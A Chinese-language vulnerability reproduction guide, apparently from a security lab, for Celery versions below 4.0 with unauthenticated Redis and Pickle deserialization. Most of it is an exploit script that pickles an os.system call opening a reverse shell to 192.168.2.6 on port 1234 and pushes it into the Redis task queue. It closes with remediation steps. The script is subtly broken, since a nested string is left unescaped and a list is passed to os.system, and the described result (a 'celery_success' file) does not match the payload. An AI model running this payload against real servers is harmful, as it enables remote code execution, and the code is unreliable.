# Celery <4.0 Redis未授权访问+Pickle反序列化利用

> [English Documentation](README_EN.md)

## 漏洞概述

`Celery` 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。

在 `Celery < 4.0` 版本默认使用 `Pickle` 进行任务消息的序列化传递，当所用队列服务（比如 Redis、RabbitMQ、RocketMQ 等）存在未授权访问问题时，可利用 `Pickle` 反序列化漏洞执行任意代码。

## 漏洞复现

使用漏洞利用脚本 `exploit.py`，该脚本仅支持在 `python3` 下使用。

### 反弹shell

```bash
docker compose logs celery
```

可以看到任务消息报错。

![](https://static.nextcyber.cn/attachments/images/course/task/4a7ad7206b9645e39be6f4fcc23d82d6.png)

可以看到成功创建了文件 `celery_success`：

![](https://static.nextcyber.cn/attachments/images/course/task/219b2dc6c2924b1581db778e4f81d47a.png)

### exploit.py

```python
import pickle
import json
import base64
import redis
import sys

r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) 

ori_str="{"content-type": "application/x-python-serialize", "properties": {"delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a", "reply_to": "9edb8565-0b59-3389-944e-a0139180a048", "delivery_mode": 2, "body_encoding": "base64", "delivery_info": {"routing_key": "celery", "priority": 0, "exchange": "celery"}, "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999"}, "headers": {}, "content-encoding": "binary", "body": "gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg=="}"

task_dict = json.loads(ori_str)

command = ['bash', '-i', '>&', '/dev/tcp/192.168.2.6/1234', '0>&1']

class Person(object):
    def __reduce__(self):
        # 未导入os模块，通用
        return (__import__('os').system, (command,))

pickleData = pickle.dumps(Person())
task_dict['body']=base64.b64encode(pickleData).decode()
print(task_dict)

r.lpush('celery',json.dumps(task_dict))
```

## 修复建议

1. **Redis 未授权访问修复**：
   - 设置 Redis 密码：`requirepass your_password`
   - 绑定 Redis 到指定 IP：`bind 127.0.0.1`
   - 禁用危险命令：`rename-command FLUSHALL ""`

2. **Celery 安全升级**：
   - 升级 Celery 到 4.0 或更高版本
   - 4.0+ 版本默认使用 JSON 序列化，安全性更高
